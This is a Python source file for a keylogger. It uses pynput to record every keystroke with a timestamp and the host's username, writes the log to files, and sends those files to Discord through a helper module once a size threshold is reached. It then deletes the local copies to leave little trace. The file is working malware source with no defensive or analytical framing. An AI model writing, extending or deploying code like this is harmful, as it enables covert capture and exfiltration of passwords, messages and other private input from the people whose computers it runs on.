import os

from pynput.keyboard import Listener, Key

from classes.Host import Host
from discord_util import discord
from utils.file_util import write_keys_to_file, get_object_size, write_legible_text_to_file
from utils.time_util import get_current_date_and_time, get_current_date

key_log = {}

host = Host()

json_file = "log_json_keys.txt"
legible_text_file = "log_legible.txt"

# discord file sending limit is 8MB, but we will use 5MB to be safe
discord_file_size_limit = 5


def should_send_file(key):
    object_size = get_object_size(key_log)
    if len(key_log) <= 2:
        return False
    # using this size for testing purposes
    return object_size >= 0.002 and (key == Key.enter or key == Key.space)


def on_press(key):
    time = get_current_date_and_time()
    key_log[time] = str(key).replace("'", "")

    print(get_object_size(key_log))
    if should_send_file(key):
        write_keys_to_file(key_log, json_file, host)
        current_date = get_current_date()
        json_file_name = "log_" + host.username + "_" + current_date + "_json.txt"
        legible_text_file_name = "log_" + host.username + "_" + current_date + ".txt"
        discord.send_file(json_file, json_file_name)
        write_legible_text_to_file(key_log, legible_text_file)
        discord.send_file(legible_text_file, legible_text_file_name)
        os.remove(json_file)
        os.remove(legible_text_file)
        key_log.clear()


def log():
    with Listener(on_press=on_press, on_release=None) as listener:
        listener.join()
        # TODO: maybe add check to force send file if program is closed
        #  or if it has been running for a long time without any new keystrokes
